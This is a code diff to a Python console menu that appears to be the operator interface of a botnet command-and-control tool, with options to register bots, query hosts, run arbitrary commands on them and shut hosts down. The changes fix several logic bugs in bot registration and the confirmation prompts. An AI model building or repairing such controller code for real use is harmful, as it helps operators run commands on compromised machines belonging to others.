@@ -39,7 +39,7 @@ def main_menu():
             rx.messages.remove(i)
             rx.tlock.release()
     print("\nMain Menu:\n")
-    print("1) Test Connection to Bot")
+    print("1) Check Network Status")
     print("2) Query Host Information")
     print("3) Run Command")
     print("4) Danger Zone")
@@ -104,7 +104,7 @@ def test_conn():
                 newbot = True
                 for b in botlist:
                     if b.identifier == i.payload[1:5]:
-                        newbot = True
+                        newbot = False
                         b.last_ping = time.time()
                 if newbot:
                     print("New bot registered!")
@@ -161,13 +161,13 @@ def arbitrary_exec():
     while time.time() - start <= 180 and running:
         for i in rx.messages:
             if i.finalized and i.payload[0] == "r" and i.payload[5:9] == "abx:":
-                print("\n--BeginCommand output--\n{}\n--End output--".format(i.payload[9:]))
+                print("\n--Begin command output--\n{}\n--End output--".format(i.payload[9:]))
                 rx.tlock.acquire()
                 rx.messages.remove(i)
                 rx.tlock.release()
                 running = False
         time.sleep(0.5)
-    if input("Run another command? (Y/n)").lower() == "n":
+    if input("Run another command? (Y/n) ").lower() == "n":
         main_menu()
     else:
         arbitrary_exec()
@@ -176,13 +176,15 @@ def arbitrary_exec():
 def danger_menu():
     show_header()
     print("WARNING: This menu is Dangerous! If you want to proceed, type 'proceed' without the quotes")
-    if input(": ") != "proceed":
+    if input(": ") == "proceed":
         print("1) Shutdown Host")
         print("2) Decommission Network")
         print("0) Exit Menu")
         tmp = input("\n Please Select an Option: ")
         if tmp == "1" or tmp == "2":
             danger_zone(int(tmp))
+    else:
+        print("Aborted.\n")
     main_menu()
 
 
@@ -190,7 +192,7 @@ def danger_zone(opt: int):
     width = shutil.get_terminal_size()[0]
     print("WARNING: Are you SURE you know what you're doing?".center(width, "="))
     a = input("Type 'double dog sure' : ")
-    if a != " double dog sure":
+    if a != "double dog sure":
         print("operation aborted.")
         main_menu()
         exit()
